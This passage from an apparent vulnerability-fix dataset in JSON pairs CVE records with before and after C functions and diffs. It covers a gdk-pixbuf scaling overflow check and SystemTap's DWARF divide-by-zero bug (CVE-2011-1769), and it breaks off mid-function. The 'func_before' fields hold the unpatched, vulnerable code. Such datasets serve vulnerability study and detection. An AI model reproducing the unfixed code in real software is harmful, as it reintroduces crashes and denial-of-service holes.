(SCALE_SHIFT - SUBSAMPLE_BITS)) & SUBSAMPLE_MASK) * (filter->x.n * filter->y.n), filter->x.n, filter->y.n,\n\t\t\t outbuf, dest_x, dest_channels, dest_has_alpha,\n\t\t\t line_bufs, src_channels, src_has_alpha,\n\t\t\t x >> SCALE_SHIFT, src_width,\n\t\t\t check_size, tcolor1, tcolor2, pixel_func);\n\n\t  x += x_step;\n\t  dest_x++;\n\t  outbuf += dest_channels;\n\t}\n\n      y += y_step;\n    }\n\n  g_free (line_bufs);\n  g_free (filter_weights);\n}",
        "func": "static void\npixops_process (guchar         *dest_buf,\n\t\tint             render_x0,\n\t\tint             render_y0,\n\t\tint             render_x1,\n\t\tint             render_y1,\n\t\tint             dest_rowstride,\n\t\tint             dest_channels,\n\t\tgboolean        dest_has_alpha,\n\t\tconst guchar   *src_buf,\n\t\tint             src_width,\n\t\tint             src_height,\n\t\tint             src_rowstride,\n\t\tint             src_channels,\n\t\tgboolean        src_has_alpha,\n\t\tdouble          scale_x,\n\t\tdouble          scale_y,\n\t\tint             check_x,\n\t\tint             check_y,\n\t\tint             check_size,\n\t\tguint32         color1,\n\t\tguint32         color2,\n\t\tPixopsFilter   *filter,\n\t\tPixopsLineFunc  line_func,\n\t\tPixopsPixelFunc pixel_func)\n{\n  int i, j;\n  int x, y;\t\t\t/* X and Y position in source (fixed_point) */\n\n  guchar **line_bufs;\n  int *filter_weights;\n\n  int x_step;\n  int y_step;\n\n  int check_shift;\n  int scaled_x_offset;\n\n  int run_end_x;\n  int run_end_index;\n\n  x_step = (1 << SCALE_SHIFT) / scale_x; /* X step in source (fixed point) */\n  y_step = (1 << SCALE_SHIFT) / scale_y; /* Y step in source (fixed point) */\n\n  if (x_step == 0 || y_step == 0)\n    return; /* overflow, bail out */\n\n  filter_weights = make_filter_table (filter);\n  if (!filter_weights)\n    return; /* overflow, bail out */\n\n  line_bufs = g_new (guchar *, filter->y.n);\n\n  check_shift = check_size ? get_check_shift (check_size) : 0;\n\n  scaled_x_offset = floor (filter->x.offset * (1 << SCALE_SHIFT));\n\n  /* Compute the index where we run off the end of the source buffer. The\n   * furthest source pixel we access at index i is:\n   *\n   *  ((render_x0 + i) * x_step + scaled_x_offset) >> SCALE_SHIFT + filter->x.n - 1\n   *\n   * So, run_end_index is the smallest i for which this pixel is src_width,\n   * i.e, for which:\n   *\n   *  (i + render_x0) * x_step >= ((src_width - filter->x.n + 1) << SCALE_SHIFT) - scaled_x_offset\n   *\n   */\n#define MYDIV(a,b) ((a) > 0 ? (a) / (b) : ((a) - (b) + 1) / (b))    /* Division so that -1/5 = -1 */\n\n  run_end_x = (((src_width - filter->x.n + 1) << SCALE_SHIFT) - scaled_x_offset);\n  run_end_index = MYDIV (run_end_x + x_step - 1, x_step) - render_x0;\n  run_end_index = MIN (run_end_index, render_x1 - render_x0);\n\n  y = render_y0 * y_step + floor (filter->y.offset * (1 << SCALE_SHIFT));\n  for (i = 0; i < (render_y1 - render_y0); i++)\n    {\n      int dest_x;\n      int y_start = y >> SCALE_SHIFT;\n      int x_start;\n      int *run_weights = filter_weights +\n                         ((y >> (SCALE_SHIFT - SUBSAMPLE_BITS)) & SUBSAMPLE_MASK) *\n                         filter->x.n * filter->y.n * SUBSAMPLE;\n      guchar *new_outbuf;\n      guint32 tcolor1, tcolor2;\n\n      guchar *outbuf = dest_buf + dest_rowstride * i;\n      guchar *outbuf_end = outbuf + dest_channels * (render_x1 - render_x0);\n\n      if (((i + check_y) >> check_shift) & 1)\n\t{\n\t  tcolor1 = color2;\n\t  tcolor2 = color1;\n\t}\n      else\n\t{\n\t  tcolor1 = color1;\n\t  tcolor2 = color2;\n\t}\n\n      for (j=0; j<filter->y.n; j++)\n\t{\n\t  if (y_start <  0)\n\t    line_bufs[j] = (guchar *)src_buf;\n\t  else if (y_start < src_height)\n\t    line_bufs[j] = (guchar *)src_buf + src_rowstride * y_start;\n\t  else\n\t    line_bufs[j] = (guchar *)src_buf + src_rowstride * (src_height - 1);\n\n\t  y_start++;\n\t}\n\n      dest_x = check_x;\n      x = render_x0 * x_step + scaled_x_offset;\n      x_start = x >> SCALE_SHIFT;\n\n      while (x_start < 0 && outbuf < outbuf_end)\n\t{\n\t  process_pixel (run_weights + ((x >> (SCALE_SHIFT - SUBSAMPLE_BITS)) & SUBSAMPLE_MASK) * (filter->x.n * filter->y.n), filter->x.n, filter->y.n,\n\t\t\t outbuf, dest_x, dest_channels, dest_has_alpha,\n\t\t\t line_bufs, src_channels, src_has_alpha,\n\t\t\t x >> SCALE_SHIFT, src_width,\n\t\t\t check_size, tcolor1, tcolor2, pixel_func);\n\n\t  x += x_step;\n\t  x_start = x >> SCALE_SHIFT;\n\t  dest_x++;\n\t  outbuf += dest_channels;\n\t}\n\n      new_outbuf = (*line_func) (run_weights, filter->x.n, filter->y.n,\n\t\t\t\t outbuf, dest_x, dest_buf + dest_rowstride *\n\t\t\t\t i + run_end_index * dest_channels,\n\t\t\t\t dest_channels, dest_has_alpha,\n\t\t\t\t line_bufs, src_channels, src_has_alpha,\n\t\t\t\t x, x_step, src_width, check_size, tcolor1,\n\t\t\t\t tcolor2);\n\n      dest_x += (new_outbuf - outbuf) / dest_channels;\n\n      x = (dest_x - check_x + render_x0) * x_step + scaled_x_offset;\n      outbuf = new_outbuf;\n\n      while (outbuf < outbuf_end)\n\t{\n\t  process_pixel (run_weights + ((x >> (SCALE_SHIFT - SUBSAMPLE_BITS)) & SUBSAMPLE_MASK) * (filter->x.n * filter->y.n), filter->x.n, filter->y.n,\n\t\t\t outbuf, dest_x, dest_channels, dest_has_alpha,\n\t\t\t line_bufs, src_channels, src_has_alpha,\n\t\t\t x >> SCALE_SHIFT, src_width,\n\t\t\t check_size, tcolor1, tcolor2, pixel_func);\n\n\t  x += x_step;\n\t  dest_x++;\n\t  outbuf += dest_channels;\n\t}\n\n      y += y_step;\n    }\n\n  g_free (line_bufs);\n  g_free (filter_weights);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -45,8 +45,11 @@\n   if (x_step == 0 || y_step == 0)\n     return; /* overflow, bail out */\n \n+  filter_weights = make_filter_table (filter);\n+  if (!filter_weights)\n+    return; /* overflow, bail out */\n+\n   line_bufs = g_new (guchar *, filter->y.n);\n-  filter_weights = make_filter_table (filter);\n \n   check_shift = check_size ? get_check_shift (check_size) : 0;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "  filter_weights = make_filter_table (filter);"
            ],
            "added_lines": [
                "  filter_weights = make_filter_table (filter);",
                "  if (!filter_weights)",
                "    return; /* overflow, bail out */",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2011-1769",
        "func_name": "systemtap/translate_runtime",
        "description": "SystemTap 1.4 and earlier, when unprivileged (aka stapusr) mode is enabled, allows local users to cause a denial of service (divide-by-zero error and OOPS) via a crafted ELF program with DWARF expressions that are not properly handled by a stap script that performs context variable access.",
        "git_url": "http://sourceware.org/git/?p=systemtap.git;a=commit;h=fa2e3415185a28542d419a641ecd6cddd52e3cd9",
        "commit_title": "",
        "commit_text": "CVE-2011-1781, CVE-2011-1769: correct DW_OP_{mod,div} division-by-zero bug      Probing a process with corrupted DWARF information, it has been     possible to create a kernel-side divison-by-zero.  This fixes.      Handle DW_OP_div/mod divide by zero. DW_OP_mod should work unsigned.      * loc2c.c (translate): Use helper functions div_op and mod_op for       DW_OP_div and DW_OP_mod operands. Set used_deref = true.     * translate.cxx (translate_runtime): Emit STAP_MSG_LOC2C_03 define.     * runtime/loc2c-runtime.h: Define dwarf_div_op and dwarf_mod_op macros.     * runtime/unwind.c (compute_expr): Check for zero before executing       DW_OP_mod or DW_OP_div. ",
        "func_before": "void translate_runtime(systemtap_session& s)\n{\n  s.op->newline() << \"#define STAP_MSG_RUNTIME_H_01 \"\n                  << lex_cast_qstring(_(\"myproc-unprivileged tapset function called \"\n                                        \"without is_myproc checking for pid %d (euid %d)\"));\n\n  s.op->newline() << \"#define STAP_MSG_LOC2C_01 \"\n                  << lex_cast_qstring(_(\"kernel read fault at 0x%p (%s)\"));\n  s.op->newline() << \"#define STAP_MSG_LOC2C_02 \"\n                  << lex_cast_qstring(_(\"kernel write fault at 0x%p (%s)\"));\n}",
        "func": "void translate_runtime(systemtap_session& s)\n{\n  s.op->newline() << \"#define STAP_MSG_RUNTIME_H_01 \"\n                  << lex_cast_qstring(_(\"myproc-unprivileged tapset function called \"\n                                        \"without is_myproc checking for pid %d (euid %d)\"));\n\n  s.op->newline() << \"#define STAP_MSG_LOC2C_01 \"\n                  << lex_cast_qstring(_(\"kernel read fault at 0x%p (%s)\"));\n  s.op->newline() << \"#define STAP_MSG_LOC2C_02 \"\n                  << lex_cast_qstring(_(\"kernel write fault at 0x%p (%s)\"));\n  s.op->newline() << \"#define STAP_MSG_LOC2C_03 \"\n                  << lex_cast_qstring(_(\"divide by zero in DWARF operand (%s)\"));\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -8,4 +8,6 @@\n                   << lex_cast_qstring(_(\"kernel read fault at 0x%p (%s)\"));\n   s.op->newline() << \"#define STAP_MSG_LOC2C_02 \"\n                   << lex_cast_qstring(_(\"kernel write fault at 0x%p (%s)\"));\n+  s.op->newline() << \"#define STAP_MSG_LOC2C_03 \"\n+                  << lex_cast_qstring(_(\"divide by zero in DWARF operand (%s)\"));\n }",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "  s.op->newline() << \"#define STAP_MSG_LOC2C_03 \"",
                "                  << lex_cast_qstring(_(\"divide by zero in DWARF operand (%s)\"));"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-1769",
        "func_name": "systemtap/translate",
        "description": "SystemTap 1.4 and earlier, when unprivileged (aka stapusr) mode is enabled, allows local users to cause a denial of service (divide-by-zero error and OOPS) via a crafted ELF program with DWARF expressions that are not properly handled by a stap script that performs context variable access.",
        "git_url": "http://sourceware.org/git/?p=systemtap.git;a=commit;h=fa2e3415185a28542d419a641ecd6cddd52e3cd9",
        "commit_title": "",
        "commit_text": "CVE-2011-1781, CVE-2011-1769: correct DW_OP_{mod,div} division-by-zero bug      Probing a process with corrupted DWARF information, it has been     possible to create a kernel-side divison-by-zero.  This fixes.      Handle DW_OP_div/mod divide by zero. DW_OP_mod should work unsigned.      * loc2c.c (translate): Use helper functions div_op and mod_op for       DW_OP_div and DW_OP_mod operands. Set used_deref = true.     * translate.cxx (translate_runtime): Emit STAP_MSG_LOC2C_03 define.     * runtime/loc2c-runtime.h: Define dwarf_div_op and dwarf_mod_op macros.     * runtime/unwind.c (compute_expr): Check for zero before executing       DW_OP_mod or DW_OP_div. ",
        "func_before": "static const char *\ntranslate (struct location_context *ctx, int indent,\n\t   const Dwarf_Op *expr, const size_t len,\n\t   struct location *input, bool *need_fb, size_t *loser,\n\t   struct location *loc)\n{\n  loc->ops = expr;\n  loc->nops = len;\n\n#define DIE(msg) return (*loser = i, N_(msg))\n\n#define emit(fmt, ...) obstack_printf (ctx->pool, fmt, ## __VA_ARGS__)\n\n  unsigned int stack_depth;\n  unsigned int max_stack = 0;\n  inline void deepen (void)\n    {\n      if (stack_depth == max_stack)\n\t++max_stack;\n    }\n\n#define POP(var)\t\t\t\t\t\t\t      \\\n    if (stack_depth > 0)\t\t\t\t\t\t      \\\n      --stack_depth;\t\t\t\t\t\t\t      \\\n    else if (tos_register != -1)\t\t\t\t\t      \\\n      fetch_tos_register ();\t\t\t\t\t\t      \\\n    else\t\t\t\t\t\t\t\t      \\\n      goto underflow;\t\t\t\t\t\t\t      \\\n    int var = stack_depth\n#define PUSH \t\t(deepen (), stack_depth++)\n#define STACK(idx)\t(stack_depth - 1 - (idx))\n\n  /* Don't put stack operations in the arguments to this.  */\n#define push(fmt, ...) \\\n  emit (\"%*s\" STACKFMT \" = \" fmt \";\\n\", indent * 2, \"\", PUSH, ## __VA_ARGS__)\n\n  int tos_register;\n  inline void fetch_tos_register (void)\n    {\n      deepen ();\n      emit (\"%*s\" STACKFMT \" = fetch_register (%d);\\n\",\n\t    indent * 2, \"\", stack_depth, tos_register);\n      tos_register = -1;\n    }\n\n  bool tos_value;\n  Dwarf_Block implicit_value;\n  bool used_deref;\n  const Dwarf_Op *implicit_pointer;\n\n  /* Initialize our state for handling each new piece.  */\n  inline void reset ()\n    {\n      stack_depth = 0;\n      tos_register = -1;\n      tos_value = false;\n      implicit_value.data = NULL;\n      implicit_pointer = NULL;\n      used_deref = false;\n\n      if (input != NULL)\n\tswitch (input->type)\n\t  {\n\t  case loc_address:\n\t    push (\"addr\");\n\t    break;\n\n\t  case loc_value:\n\t    push (\"addr\");\n\t    tos_value = true;\n\t    break;\n\n\t  case loc_register:\n\t    tos_register = input->reg.regno;\n\t    break;\n\n\t  default:\n\t    abort ();\n\t    break;\n\t  }\n    }\n\n  size_t i;\n  inline const char *finish (struct location *piece)\n    {\n      if (piece->nops == 0)\n\t{\n\t  assert (stack_depth == 0);\n\t  assert (tos_register == -1);\n\t  assert (obstack_object_size (ctx->pool) == 0);\n\t  piece->type = loc_unavailable;\n\t}\n      else if (stack_depth >= 1)\n\t{\n\t  /* The top of stack has our value.\n\t     Other stack slots left don't matter.  */\n\t  obstack_1grow (ctx->pool, '\\0');\n\t  char *program = obstack_finish (ctx->pool);\n\t  if (implicit_pointer != NULL)\n\t    {\n\t      piece->type = loc_implicit_pointer;\n\t      piece->pointer.offset = implicit_pointer->number2;\n#if !_ELFUTILS_PREREQ (0, 149)\n\t      /* Then how did we get here?  */\n\t      abort ();\n#else\n\t      Dwarf_Attribute target;\n\t      if (dwarf_getlocation_implicit_pointer (ctx->attr,\n\t\t\t\t\t\t      implicit_pointer,\n\t\t\t\t\t\t      &target) != 0)\n\t\tDIE (\"invalid implicit pointer\");\n\t      switch (dwarf_whatattr (&target))\n\t\t{\n\t\tcase DW_AT_const_value:\n\t\t  piece->pointer.target = translate_constant (ctx, indent,\n\t\t\t\t\t\t\t      &target);\n\t\t  break;\n\t\tcase DW_AT_location:\n\t\t  piece->pointer.target = location_from_attr (ctx, indent,\n\t\t\t\t\t\t\t      &target);\n\t\t  break;\n\t\tdefault:\n\t\t  DIE (\"unexpected implicit pointer attribute!\");\n\t\t  break;\n\t\t}\n#endif\n\t    }\n\t  else if (implicit_value.data == NULL)\n\t    {\n\t      piece->type = tos_value ? loc_value : loc_address;\n\t      piece->address.declare = NULL;\n\t      piece->address.program = program;\n\t      piece->address.stack_depth = max_stack;\n\t      piece->address.used_deref = used_deref;\n\t    }\n\t  else\n\t    {\n\t      piece->type = loc_constant;\n\t      piece->byte_size = implicit_value.length;\n\t      piece->constant_block = implicit_value.data;\n\t    }\n\t}\n      else if (tos_register == -1)\n\tDIE (\"stack underflow\");\n      else if (obstack_object_size (ctx->pool) != 0)\n\tDIE (\"register value must stand alone in location expression\");\n      else\n\t{\n\t  piece->type = loc_register;\n\t  piece->reg.regno = tos_register;\n\t  piece->reg.offset = 0;\n\t}\n      return NULL;\n    }\n\n  reset ();\n  struct location *pieces = NULL, **tailpiece = &pieces;\n  size_t piece_expr_start = 0;\n  Dwarf_Word piece_total_bytes = 0;\n  for (i = 0; i < len; ++i)\n    {\n      unsigned int reg;\n      uint_fast8_t sp;\n      Dwarf_Word value;\n\n      inline bool more_ops (void)\n      {\n\treturn (expr[i].atom != DW_OP_nop\n\t\t&& expr[i].atom != DW_OP_piece\n\t\t&& expr[i].atom != DW_OP_bit_piece);\n      }\n\n      if (tos_value && more_ops ())\n\tDIE (\"operations follow DW_OP_stack_value\");\n\n      if (implicit_value.data != NULL && more_ops ())\n\tDIE (\"operations follow DW_OP_implicit_value\");\n\n      if (implicit_pointer != NULL && more_ops ())\n\tDIE (\"operations follow DW_OP_GNU_implicit_pointer\");\n\n      switch (expr[i].atom)\n\t{\n\t  /* Basic stack operations.  */\n\tcase DW_OP_nop:\n\t  break;\n\n\tcase DW_OP_dup:\n\t  if (stack_depth < 1)\n\t    goto underflow;\n\t  else\n\t    {\n\t      unsigned int tos = STACK (0);\n\t      push (STACKFMT, tos);\n\t    }\n\t  break;\n\n\tcase DW_OP_drop:\n\t  {\n\t    POP (ignore);\n\t    emit (\"%*s/* drop \" STACKFMT \"*/\\n\", indent * 2, \"\", ignore);\n\t    break;\n\t  }\n\n\tcase DW_OP_pick:\n\t  sp = expr[i].number;\n\top_pick:\n\t  if (sp >= stack_depth)\n\t    goto underflow;\n\t  sp = STACK (sp);\n\t  push (STACKFMT, sp);\n\t  break;\n\n\tcase DW_OP_over:\n\t  sp = 1;\n\t  goto op_pick;\n\n\tcase DW_OP_swap:\n\t  if (stack_depth < 2)\n\t    goto underflow;\n\t  deepen ();\t\t/* Use a temporary slot.  */\n\t  emit (\"%*s\"\n\t\tSTACKFMT \" = \" STACKFMT \", \"\n\t\tSTACKFMT \" = \" STACKFMT \", \"\n\t\tSTACKFMT \" = \" STACKFMT \";\\n\",\n\t\tindent * 2, \"\",\n\t\tSTACK (-1), STACK (0),\n\t\tSTACK (0), STACK (1),\n\t\tSTACK (1), STACK (-1));\n\t  break;\n\n\tcase DW_OP_rot:\n\t  if (stack_depth < 3)\n\t    goto underflow;\n\t  deepen ();\t\t/* Use a temporary slot.  */\n\t  emit (\"%*s\"\n\t\tSTACKFMT \" = \" STACKFMT \", \"\n\t\tSTACKFMT \" = \" STACKFMT \", \"\n\t\tSTACKFMT \" = \" STACKFMT \", \"\n\t\tSTACKFMT \" = \" STACKFMT \";\\n\",\n\t\tindent * 2, \"\",\n\t\tSTACK (-1), STACK (0),\n\t\tSTACK (0), STACK (1),\n\t\tSTACK (1), STACK (2),\n\t\tSTACK (3), STACK (-1));\n\t  break;\n\n\n\t  /* Control flow operations.  */\n\tcase DW_OP_skip:\n\t  {\n\t    Dwarf_Off target = expr[i].offset + 3 + expr[i].number;\n\t    while (i + 1 < len && expr[i + 1].offset < target)\n\t      ++i;\n\t    if (expr[i + 1].offset != target)\n\t      DIE (\"invalid skip target\");\n\t    break;\n\t  }\n\n\tcase DW_OP_bra:\n\t  DIE (\"conditional branches not supported\");\n\t  break;\n\n\n\t  /* Memory access.  */\n\tcase DW_OP_deref:\n\t  {\n\t    POP (addr);\n\t    push (\"deref (sizeof (void *), \" STACKFMT \")\", addr);\n\t    used_deref = true;\n\t  }\n\t  break;\n\n\tcase DW_OP_deref_size:\n\t  {\n\t    POP (addr);\n\t    push (\"deref (\" UFORMAT \", \" STACKFMT \")\",\n\t\t  expr[i].number, addr);\n\t    used_deref = true;\n\t  }\n\t  break;\n\n\tcase DW_OP_xderef:\n\t  {\n\t    POP (addr);\n\t    POP (as);\n\t    push (\"xderef (sizeof (void *), \" STACKFMT \", \" STACKFMT \")\",\n\t\t  addr, as);\n\t    used_deref = true;\n\t  }\n\t  break;\n\n\tcase DW_OP_xderef_size:\n\t  {\n\t    POP (addr);\n\t    POP (as);\n\t    push (\"xderef (\" UFORMAT \", \" STACKFMT \", \" STACKFMT \")\",\n\t\t  expr[i].number, addr, as);\n\t    used_deref = true;\n\t  }\n\t  break;\n\n\t  /* Constant-value operations.  */\n\n\tcase DW_OP_addr:\n\t  emit (\"%*s\" STACKFMT \" = \", indent * 2, \"\", PUSH);\n\t  (*ctx->emit_address) (ctx->fail_arg, ctx->pool,\n\t\t\t\tctx->dwbias + expr[i].number);\n\t  emit (\";\\n\");\n\t  break;\n\n\tcase DW_OP_lit0 ... DW_OP_lit31:\n\t  value = expr[i].atom - DW_OP_lit0;\n\t  goto op_const;\n\n\tcase DW_OP_const1u:\n\tcase DW_OP_const1s:\n\tcase DW_OP_const2u:\n\tcase DW_OP_const2s:\n\tcase DW_OP_const4u:\n\tcase DW_OP_const4s:\n\tcase DW_OP_const8u:\n\tcase DW_OP_const8s:\n\tcase DW_OP_constu:\n\tcase DW_OP_consts:\n\t  value = expr[i].number;\n\top_const:\n\t  push (SFORMAT, value);\n\t  break;\n\n\t  /* Arithmetic operations.  */\n#define UNOP(dw_op, c_op)\t\t\t\t\t\t      \\\n\tcase DW_OP_##dw_op:\t\t\t\t\t\t      \\\n\t  {\t\t\t\t\t\t\t\t      \\\n\t    POP (tos);\t\t\t\t\t\t\t      \\\n\t    push (\"%s (\" STACKFMT \")\", #c_op, tos);\t\t\t      \\\n\t  }\t\t\t\t\t\t\t\t      \\\n\t  break\n#define BINOP(dw_op, c_op)\t\t\t\t\t\t      \\\n\tcase DW_OP_##dw_op:\t\t\t\t\t\t      \\\n\t  {\t\t\t\t\t\t\t\t      \\\n\t    POP (b);\t\t\t\t\t\t\t      \\\n\t    POP (a);\t\t\t\t\t\t\t      \\\n\t    push (STACKFMT \" %s \" STACKFMT, a, #c_op, b);\t\t      \\\n\t  }\t\t\t\t\t\t\t\t      \\\n\t  break\n\n\t  UNOP (abs, op_abs);\n\t  BINOP (and, &);\n\t  BINOP (minus, -);\n\t  BINOP (mod, %);\n\t  BINOP (mul, *);\n\t  UNOP (neg, -);\n\t  UNOP (not, ~);\n\t  BINOP (or, |);\n\t  BINOP (plus, +);\n\t  BINOP (shl, <<);\n\t  BINOP (shr, >>);\n\t  BINOP (xor, ^);\n\n\t  /* Comparisons are binary operators too.  */\n\t  BINOP (le, <=);\n\t  BINOP (ge, >=);\n\t  BINOP (eq, ==);\n\t  BINOP (lt, <);\n\t  BINOP (gt, >);\n\t  BINOP (ne, !=);\n\n#undef\tUNOP\n#undef\tBINOP\n\n\tcase DW_OP_shra:\n\t  {\n\t    POP (b);\n\t    POP (a);\n\t    push (\"(%s) \" STACKFMT \" >> (%s)\" STACKFMT,\n\t\t  stack_slot_type (loc, true), a,\n\t\t  stack_slot_type (loc, true), b);\n\t    break;\n\t  }\n\n\tcase DW_OP_div:\n\t  {\n\t    POP (b);\n\t    POP (a);\n\t    push (\"(%s) \" STACKFMT \" / (%s)\" STACKFMT,\n\t\t  stack_slot_type (loc, true), a,\n\t\t  stack_slot_type (loc, true), b);\n\t    break;\n\t  }\n\n\tcase DW_OP_plus_uconst:\n\t  {\n\t    POP (x);\n\t    push (STACKFMT \" + \" UFORMAT, x, expr[i].number);\n\t  }\n\t  break;\n\n\n\t  /* Register-relative addressing.  */\n\tcase DW_OP_breg0 ... DW_OP_breg31:\n\t  reg = expr[i].atom - DW_OP_breg0;\n\t  value = expr[i].number;\n\t  goto op_breg;\n\n\tcase DW_OP_bregx:\n\t  reg = expr[i].number;\n\t  value = expr[i].number2;\n\top_breg:\n\t  push (\"fetch_register (%u) + \" SFORMAT, reg, value);\n\t  break;\n\n\tcase DW_OP_fbreg:\n\t  if (need_fb == NULL)\n\t    DIE (\"DW_OP_fbreg from DW_AT_frame_base\");\n\t  *need_fb = true;\n\t  push (\"frame_base + \" SFORMAT, expr[i].number);\n\t  break;\n\n\t  /* Direct register contents.  */\n\tcase DW_OP_reg0 ... DW_OP_reg31:\n\t  reg = expr[i].atom - DW_OP_reg0;\n\t  goto op_reg;\n\n\tcase DW_OP_regx:\n\t  reg = expr[i].number;\n\top_reg:\n\t  tos_register = reg;\n\t  break;\n\n\t  /* Special magic.  */\n\tcase DW_OP_piece:\n\t  if (stack_depth > 1)\n\t    /* If this ever happens we could copy the program.  */\n\t    DIE (\"DW_OP_piece left multiple values on stack\");\n\t  else\n\t    {\n\t      /* The obstack has a pending program for loc_address,\n\t\t so we must finish that piece off before we can\n\t\t allocate again.  */\n\t      struct location temp_piece =\n\t\t{\n\t\t  .context = loc->context,\n\t\t  .frame_base = NULL,\n\t\t  .ops = &expr[piece_expr_start],\n\t\t  .nops = i - piece_expr_start,\n\t\t};\n\t      const char *failure = finish (&temp_piece);\n\t      if (failure != NULL)\n\t\treturn failure;\n\n\t      struct location *piece = obstack_alloc (ctx->pool, sizeof *piece);\n\t      *piece = temp_piece;\n\n\t      piece_expr_start = i + 1;\n\n\t      piece_total_bytes += piece->byte_size = expr[i].number;\n\n\t      *tailpiece = piece;\n\t      tailpiece = &piece->next;\n\t      piece->next = NULL;\n\n\t      /* Reset default conditions for handling the next piece.  */\n\t      reset ();\n\t    }\n\t  break;\n\n\tcase DW_OP_stack_value:\n\t  if (stack_depth > 1)\n\t    DIE (\"DW_OP_stack_value left multiple values on stack\");\n\t  else\n\t    {\n\t      /* Fetch a register to top of stack, or check for underflow.\n\t\t Then mark the TOS as being a value.  */\n\t      POP (tos);\n\t      assert (tos == 0);\n\t      PUSH;\n\t      tos_value = true;\n\t    }\n\t  break;\n\n\tcase DW_OP_implicit_value:\n\t  if (ctx->attr == NULL)\n\t    DIE (\"DW_OP_implicit_value used in invalid context\"\n\t\t \" (no DWARF attribute, ABI return value location?)\");\n\n\t  /* It's supposed to appear by itself, except for DW_OP_piece.  */\n\t  if (stack_depth != 0)\n\t    DIE (\"DW_OP_implicit_value follows stack operations\");\n\n#if _ELFUTILS_PREREQ (0, 143)\n\t  if (dwarf_getlocation_implicit_value (ctx->attr,\n\t\t\t\t\t\t(Dwarf_Op *) &expr[i],\n\t\t\t\t\t\t&implicit_value) != 0)\n\t    DIE (\"dwarf_getlocation_implicit_value failed\");\n\n\t  /* Fake top of stack: implicit_value being set marks it.  */\n\t  PUSH;\n\t  break;\n#endif\n\n\t  DIE (\"DW_OP_implicit_value not supported\");\n\t  break;\n\n#if _ELFUTILS_PREREQ (0, 149)\n\tcase DW_OP_GNU_implicit_pointer:\n\t  implicit_pointer = &expr[i];\n\t  /* Fake top of stack: implicit_pointer being set marks it.  */\n\t  PUSH;\n\t  break;\n#endif\n\n\tcase DW_OP_call_frame_cfa:\n\t  // We pick this out when processing DW_AT_frame_base in\n\t  // so it really shouldn't turn up here.\n\t  if (need_fb == NULL)\n\t    DIE (\"DW_OP_call_frame_cfa while processing frame base\");\n\t  else\n\t    DIE (\"DW_OP_call_frame_cfa not expected outside DW_AT_frame_base\");\n\t  break;\n\n\tcase DW_OP_push_object_address:\n\t  DIE (\"XXX DW_OP_push_object_address\");\n\t  break;\n\n\tdefault:\n\t  DIE (\"unrecognized operation\");\n\t  break;\n\t}\n    }\n\n  if (pieces == NULL)\n    return finish (loc);\n\n  if (piece_expr_start != i)\n    DIE (\"extra operations after last DW_OP_piece\");\n\n  loc->type = loc_noncontiguous;\n  loc->pieces = pieces;\n  loc->byte_size = piece_total_bytes;\n\n  return NULL;\n\n underflow:\n  DIE (\"stack underflow\");\n\n#undef emit\n#undef push\n#undef PUSH\n#undef POP\n#undef STACK\n#undef DIE\n}",
        "func": "static const char *\ntranslate (struct location_context *ctx, int indent,\n\t   const Dwarf_Op *expr, const size_t len,\n\t   struct location *input, bool *need_fb, size_t *loser,\n\t   struct location *loc)\n{\n  loc->ops = expr;\n  loc->nops = len;\n\n#define DIE(msg) return (*loser = i, N_(msg))\n\n#define emit(fmt, ...) obstack_printf (ctx->pool, fmt, ## __VA_ARGS__)\n\n  unsigned int stack_depth;\n  unsigned int max_stack = 0;\n  inline void deepen (void)\n    {\n      if (stack_depth == max_stack)\n\t++max_stack;\n    }\n\n#define POP(var)\t\t\t\t\t\t\t      \\\n    if (stack_depth > 0)\t\t\t\t\t\t      \\\n      --stack_depth;\t\t\t\t\t\t\t      \\\n    else if (tos_register != -1)\t\t\t\t\t      \\\n      fetch_tos_register ();\t\t\t\t\t\t      \\\n    else\t\t\t\t\t\t\t\t      \\\n      goto underflow;\t\t\t\t\t\t\t      \\\n    int var = stack_depth\n#define PUSH \t\t(deepen (), stack_depth++)\n#define STACK(idx)\t(stack_depth - 1 - (idx))\n\n  /* Don't put stack operations in the arguments to this.  */\n#define push(fmt, ...) \\\n  emit (\"%*s\" STACKFMT \" = \" fmt \";\\n\", indent * 2, \"\", PUSH, ## __VA_ARGS__)\n\n  int tos_register;\n  inline void fetch_tos_register (void)\n    {\n      deepen ();\n      emit (\"%*s\" STACKFMT \" = fetch_register (%d);\\n\",\n\t    indent * 2, \"\", stack_depth, tos_register);\n      tos_register = -1;\n    }\n\n  bool tos_value;\n  Dwarf_Block implicit_value;\n  bool used_deref;\n  const Dwarf_Op *implicit_pointer;\n\n  /* Initialize our state for handling each new piece.  */\n  inline void reset ()\n    {\n      stack_depth = 0;\n      tos_register = -1;\n      tos_value = false;\n      implicit_value.data = NULL;\n      implicit_pointer = NULL;\n      used_deref = false;\n\n      if (input != NULL)\n\tswitch (input->type)\n\t  {\n\t  case loc_address:\n\t    push (\"addr\");\n\t    break;\n\n\t  case loc_value:\n\t    push (\"addr\");\n\t    tos_value = true;\n\t    break;\n\n\t  case loc_register:\n\t    tos_register = input->reg.regno;\n\t    break;\n\n\t  default:\n\t    abort ();\n\t    break;\n\t  }\n    }\n\n  size_t i;\n  inline const char *finish (struct location *piece)\n    {\n      if (piece->nops == 0)\n\t{\n\t  assert (stack_depth == 0);\n\t  assert (tos_register == -1);\n\t  assert (obstack_object_size (ctx->pool) == 0);\n\t  piece->type = loc_unavailable;\n\t}\n      else if (stack_depth >= 1)\n\t{\n\t  /* The top of stack has our value.\n\t     Other stack slots left don't matter.  */\n\t  obstack_1grow (ctx->pool, '\\0');\n\t  char *program = obstack_finish (ctx->pool);\n\t  if (implicit_pointer != NULL)\n\t    {\n\t      piece->type = loc_implicit_pointer;\n\t      piece->pointer.offset = implicit_pointer->number2;\n#if !_ELFUTILS_PREREQ (0, 149)\n\t      /* Then how did we get here?  */\n\t      abort ();\n#else\n\t      Dwarf_Attribute target;\n\t      if (dwarf_getlocation_implicit_pointer (ctx->attr,\n\t\t\t\t\t\t      implicit_pointer,\n\t\t\t\t\t\t      &target) != 0)\n\t\tDIE (\"invalid implicit pointer\");\n\t      switch (dwarf_whatattr (&target))\n\t\t{\n\t\tcase DW_AT_const_value:\n\t\t  piece->pointer.target = translate_constant (ctx, indent,\n\t\t\t\t\t\t\t      &target);\n\t\t  break;\n\t\tcase DW_AT_location:\n\t\t  